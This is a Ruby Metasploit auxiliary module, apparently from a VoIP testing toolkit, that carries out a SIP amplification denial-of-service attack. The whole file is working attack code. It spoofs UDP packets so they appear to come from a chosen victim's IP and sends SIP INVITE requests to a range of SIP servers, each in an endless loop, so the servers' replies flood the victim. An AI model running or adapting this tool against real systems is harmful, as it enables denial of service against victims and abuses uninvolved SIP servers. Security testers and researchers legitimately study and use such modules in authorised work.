##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Auxiliary::Scanner
        include Msf::Auxiliary::SIP

	def initialize
		super(
			'Name'        => 'DDOS SIP Amplification Attack',
			'Version'     => '$Revision$',
			'Description' => 'DDOS SIP Amplification Attack',
			'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
			'License'     => MSF_LICENSE
		)

		begin
			require 'pcaprub'
			@@havepcap = true
		rescue ::LoadError
			@@havepcap = false
		end

		deregister_options('FILTER','PCAPFILE','RPORT', 'RHOSTS', 'RPORTS', 'RHOST' )
		register_options(
		[
			OptInt.new('VICTIM_PORT', [true, 'Target UDP Port of Victim', "5060"]),
			OptAddress.new('VICTIM_IP', [true, 'Target IP of Victim']),
			OptAddressRange.new('SIP_SERVERS', [true, 'Vulnerable SIP Servers']),
			OptInt.new('SIP_PORT',   [true, 'Target Port of The SIP Server',5060]),
			OptString.new('TO',   [ true, "Destination Number at Target SIP Server", "100"]),
			OptString.new('FROM',   [ true, "Source Number for Target SIP Server", "100"]),
		], self.class)

		register_advanced_options(
		[
			OptString.new('CUSTOMHEADER', [false, 'Custom Headers for Requests', nil]),
			OptString.new('P-Charging-Vector', [false, 'Proxy Charging Field. Sample: icid-value=msanicid;msan-id=msan123;msan-pro=1 ', nil]),
			OptString.new('Record-Route', [false, 'Proxy Record-Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
			OptString.new('Route', [false, 'Proxy Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
			OptBool.new('DEBUG',   [ false, "Verbose Level", false]),
			OptBool.new('VERBOSE',   [ false, "Verbose Level", false]),
		], self.class)
	end

	def run
		sip_hosts = Rex::Socket::RangeWalker.new(datastore['SIP_SERVERS'])
		sip_port = datastore['SIP_RPORT']
		victim_ip = datastore['VICTIM_IP']
		victim_port = datastore['VICTIM_PORT']
		to = datastore['TO']
		from = datastore['FROM']
		begin

			#Building Custom Headers
			customheader = ""
			customheader << datastore['CUSTOMHEADER']+"\r\n" if datastore['CUSTOMHEADER'] != nil
			customheader << "P-Charging-Vector: "+datastore['P-Charging-Vector']+"\r\n" if datastore['P-Charging-Vector'] != nil
			customheader << "Record-Route: "+datastore['Record-Route']+"\r\n" if datastore['Record-Route'] != nil
			customheader << "Route: "+datastore['Route']+"\r\n" if datastore['Route'] != nil	
			
			print_status("Starting SIP Amplification Attack for #{datastore['VICTIM_IP']}")

			a = []
			sip_hosts.each do |s_host|
				a << framework.threads.spawn("Module(#{self.refname})", false, s_host) do |sip_host|
					print_status "Sending Spoofed Packets to : #{sip_host}"
					while 1
					send_request(victim_ip,victim_port,sip_host,sip_port,to,from,customheader)
					end
				end
			end
			a.map {|x| x.join }

			print_good("Spoofed Trust Sweep Completed")

		rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError
		rescue ::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		ensure 
			a.map {|x| x.kill }
		end
	end
	def send_request(src_ip,src_port,ip,port,to,from,cheader,fromname=nil)
		#Assembling Packet
		open_pcap
		p = PacketFu::UDPPacket.new
		p.ip_saddr = src_ip
		p.ip_daddr = ip 
		p.ip_ttl = 255
		p.udp_sport = src_port
		p.udp_dport = port
		p.payload=prep_invite(src_ip,src_port,ip,port,to,from,cheader,fromname)
		p.recalc

		#Sending Packet
		ret = send(ip,p)
		if ret == :done
			vprint_status("#{src_ip}: Sent a packet to #{ip} from #{src_port}")
		else
			print_error("#{src_ip}: Packet not sent for port #{src_port} ")
		end
		close_pcap

	end
	def prep_invite(src_addr,src_port,ip,port,to,from,cheader,fromname=nil)
		fromname="#{src_addr}:#{src_port}" if fromname.nil?

		#Preparing Request
		data =  "INVITE sip:#{to}@#{ip} SIP/2.0\r\n"
		data += "Via: SIP/2.0/UDP #{src_addr}:#{src_port};branch=branch#{Rex::Text.rand_text_alphanumeric(10)};rport\r\n"
		data += "Max-Forwards: 70\r\n"
		if fromname == nil
			data += "From: <sip:#{from}@#{ip}>\r\n"
		else
			data += "From: \"#{fromname}\" <sip:#{from}@#{src_addr}>;tag=tag#{Rex::Text.rand_text_alphanumeric(10)}\r\n"
		end
		data += "To: <sip:#{to}@#{ip}>\r\n"
		if datastore['FROM'] =~ /FUZZ/
			data += "Contact: <sip:123@#{src_addr}>\r\n"
		elsif datastore['CONTACT'] =~ /FUZZ/
			data += "Contact: <sip:#{"A"*datastore['CONTACT'].split(" ")[1].to_i}@#{src_addr}>\r\n"
		else
			data += "Contact: <sip:#{from}@#{src_addr}>\r\n"
		end
		data += "Call-ID: call#{Rex::Text.rand_text_alphanumeric(10)}@#{src_addr}\r\n"
		data += "CSeq: 1 INVITE\r\n"
		data += "User-Agent: Test Agent\r\n"
		#data += "Date: Tue, 26 Mar 2013 12:37:54 GMT\r\n"
		data += "Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO\r\n"
		data += "Supported: replaces, timer\r\n"
		data += cheader 
		data += "Content-Type: application/sdp\r\n"

		idata = "v=0\r\n"
		idata += "o=root 1716603896 1716603896 IN IP4 #{src_addr}\r\n"
		idata += "s=Test Source\r\n"
		idata += "c=IN IP4 #{src_addr}\r\n"
		idata += "t=0 0\r\n"
		idata += "m=audio 10024 RTP/AVP 0 101\r\n"
		idata += "a=rtpmap:0 PCMU/8000\r\n"
		idata += "a=rtpmap:101 telephone-event/8000\r\n"
		idata += "a=fmtp:101 0-16\r\n"
		idata += "a=ptime:20\r\n"
		idata += "a=sendrec\r\n"

		data += "Content-Length: #{idata.length}\r\n\r\n#{idata}"
		
		return data		

	end

	def send(ip,pkt)
		begin
			capture_sendto(pkt, ip)
		rescue RuntimeError => e
			return :error
		end
		return :done
	end


end
